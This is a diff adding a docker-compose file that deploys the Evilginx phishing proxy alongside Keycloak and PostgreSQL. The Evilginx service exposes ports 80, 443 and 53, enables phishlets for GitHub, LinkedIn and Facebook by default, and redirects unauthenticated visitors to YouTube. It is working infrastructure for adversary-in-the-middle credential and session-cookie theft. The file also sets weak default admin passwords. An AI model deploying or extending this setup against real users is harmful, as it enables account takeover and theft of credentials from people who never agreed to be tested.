@@ -1,0 +1,135 @@
+version: '3.3'
+
+services:
+  # PostgreSQL for Keycloak
+  keycloak-db:
+    image: postgres:15-alpine
+    container_name: keycloak-db
+    restart: unless-stopped
+    environment:
+      POSTGRES_DB: keycloak
+      POSTGRES_USER: keycloak
+      POSTGRES_PASSWORD: ${KEYCLOAK_DB_PASSWORD:-keycloak123}
+    volumes:
+      - keycloak-db-data:/var/lib/postgresql/data
+    healthcheck:
+      test: ["CMD-SHELL", "pg_isready -U keycloak"]
+      interval: 10s
+      timeout: 5s
+      retries: 5
+
+  # Keycloak Identity Provider
+  keycloak:
+    image: quay.io/keycloak/keycloak:24.0
+    container_name: keycloak
+    restart: unless-stopped
+    command: start-dev --import-realm
+    environment:
+      KC_HEALTH_ENABLED: "true"
+      KC_DB: postgres
+      KC_DB_URL: jdbc:postgresql://keycloak-db:5432/keycloak
+      KC_DB_USERNAME: keycloak
+      KC_DB_PASSWORD: ${KEYCLOAK_DB_PASSWORD:-keycloak123}
+      KC_DOMAIN: ${KEYCLOAK_HOSTNAME:-localhost}
+      KC_HOSTNAME: ${KEYCLOAK_HOSTNAME:-localhost}
+      KC_HOSTNAME_PORT: ${KEYCLOAK_HOSTNAME_PORT:-8080}
+      KC_HOSTNAME_STRICT: "false"
+      KC_HTTP_ENABLED: "true"
+      KC_PROXY: edge
+      KEYCLOAK_ADMIN: ${KEYCLOAK_ADMIN:-admin}
+      KEYCLOAK_ADMIN_PASSWORD: ${KEYCLOAK_ADMIN_PASSWORD:-admin123}
+    volumes:
+      - ./config/keycloak/realms:/opt/keycloak/data/import
+    depends_on:
+      - keycloak-db
+    ports:
+      - "8080:8080"
+    healthcheck:
+      test: ["CMD-SHELL", "exec 3<>/dev/tcp/127.0.0.1/8080 && echo -e 'GET /health/ready HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n' >&3 && cat <&3 | grep -q '200 OK'"]
+      interval: 30s
+      timeout: 10s
+      retries: 5
+
+  # Evilginx with Keycloak integration
+  evilginx:
+    build:
+      context: .
+      args:
+        EVILGINX_TAG: v3.3.0
+    image: evilginx:latest
+    container_name: evilginx
+    restart: unless-stopped
+    ports:
+      - "80:80"
+      - "443:443"
+      - "53:53/udp"
+
+    cap_add:
+      - NET_BIND_SERVICE
+
+    volumes:
+      - ./config/evilginx/phishlets:/config/phishlets
+      - ./config/evilginx/certs:/config/certs
+      - ./logs/evilginx:/config/logs
+
+    environment:
+      # Evilginx core
+      - EVILGINX_DOMAIN=${EVILGINX_DOMAIN}
+      - EVILGINX_EXTERNAL_IPV4=${EVILGINX_EXTERNAL_IPV4}
+      - EVILGINX_BIND_IPV4=0.0.0.0
+      - EVILGINX_DNS_PORT=53
+      - EVILGINX_HTTPS_PORT=443
+      - EVILGINX_HTTP_PORT=80
+      - EVILGINX_UNAUTH_URL=https://youtube.com
+      - EVILGINX_ENABLE_PHISHLETS=${EVILGINX_ENABLE_PHISHLETS:-github,linkedin,facebook}
+      - EVILGINX_DEVELOPER=${EVILGINX_DEVELOPER:-false}
+      - EVILGINX_DEBUG=${EVILGINX_DEBUG:-false}
+      - EVILGINX_LOG_FILE=/config/logs/evilginx.log
+
+      # Keycloak Integration
+      - KEYCLOAK_URL=http://keycloak:8080
+      - KEYCLOAK_REALM=${KEYCLOAK_REALM:-evilginx}
+      - KEYCLOAK_ADMIN=${KEYCLOAK_ADMIN:-admin}
+      - KEYCLOAK_ADMIN_PASSWORD=${KEYCLOAK_ADMIN_PASSWORD:-admin123}
+      - KEYCLOAK_CLIENT_ID=${KEYCLOAK_CLIENT_ID:-evilginx-proxy}
+      - KEYCLOAK_CLIENT_SECRET=${KEYCLOAK_CLIENT_SECRET}
+      - KEYCLOAK_CLIENT_SECRET_FILE=/run/secrets/keycloak_client_secret
+      - CERTMAGIC_STORAGE=/config/certs/certmagic
+
+    secrets:
+      - keycloak_client_secret
+
+    security_opt:
+      - no-new-privileges:true
+
+    healthcheck:
+      test: ["CMD", "sh", "-c", "kill -0 $$(cat /tmp/evilginx.pid 2>/dev/null) 2>/dev/null || pgrep -f evilginx >/dev/null"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+
+    depends_on:
+      - keycloak
+
+    deploy:
+      resources:
+        limits:
+          cpus: '2'
+          memory: 2G
+        reservations:
+          cpus: '0.5'
+          memory: 512M
+
+    logging:
+      driver: "json-file"
+      options:
+        max-size: "10m"
+        max-file: "3"
+
+secrets:
+  keycloak_client_secret:
+    file: ./secrets/keycloak_client_secret.txt
+
+volumes:
+  keycloak-db-data:
+
